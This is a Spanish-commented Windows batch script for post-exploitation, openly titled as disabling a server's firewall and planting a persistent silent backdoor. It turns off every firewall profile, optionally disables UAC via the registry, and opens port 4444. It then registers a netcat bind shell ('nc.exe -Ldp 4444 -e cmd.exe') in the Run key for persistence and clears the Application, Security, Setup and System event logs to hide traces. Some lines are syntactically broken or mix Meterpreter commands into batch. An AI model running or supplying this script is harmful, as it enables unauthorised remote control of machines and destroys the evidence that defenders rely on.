@echo off 
title "DESACTIVAR FIREWALL SERVIDOR  E IMPLANTAR UN BACKDOOR PERSISTENTE SILENCIOSO CONTRA APAGADO  SISTEMA"
echo "BORRADO DE LOS LOGS DEL SISTEMA PARA NO DEJAR HUELLAS"
netsh advfirewall set allprofiles state off 
pause


#########################_DESACTIVAR_UAC_WINDOWS_(DEPENDIENDO_WINDOWS_VERSION)#################################
echo "por favor seleccione una opcion de acuerdo a sus posibilidades de post-explotacion"
echo "OPCION 1:      DESHABILITAR EL UAC DE WINDOWS"
echo "OTRA OPCION:   HABILITAR EL UAC DE WINDOWS"
set /p opcion=seleccion


if    %opcion%==1    goto deshabilitar_uac
else  %opcion%==2    goto habilitar_uac



:deshabilitar_uac
C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
goto instalando
:habilitar_uac
C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
goto instalando


:instalando
#########################_INSTALANDO_BACKDOOR_EN_EL_SISTEMA_#######################################################
#########################_TROYANIZANDO_SISTEMA_####################################################################
"echo abriendo el puerto necesario para conectarse remotamente"
netsh advfirewall firewall add rule name=’netcat’ dir=in action=allow protocol=Tcp localport=4444
netsh firewall show portopening
pause


#####_INICIALIZAR_NCAT_####
####_PRECAUCION_ANTES_DEBEREMOS_SUBIR_CON_UPLOAD_EL_NCAT_EN_METERPRETER_####



start C:\\Windows\\system32\\ncat.exe

###_INSTALACION_NETCAT_EN_REGISTRO_WINDOWS_###
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v netcat -d ‘C:\windows\system32\nc.exe -Ldp 4444 -e cmd.exe’



##########################_ENUMERANDO_LOGS_DEL_SISTEMA_##################################################################
wevtutil enum-logs
pause
cls
###########################_BORRAR_LOGS_DEL_SISTEMA_######################################################################
echo "inicializando el borrado de los logs del sistema"
echo "esperando ejecucion de codigo"
wevtutil clear-log Application 
wevtutil clear-log Security 
wevtutil clear-log Setup 
wevtutil clear-log System
pause
###########################_COMPROBANDO_LOGS_DEL_SISTEMA_BORRADOS############################################################
wevtutil enum-logs
pause
cls
exit

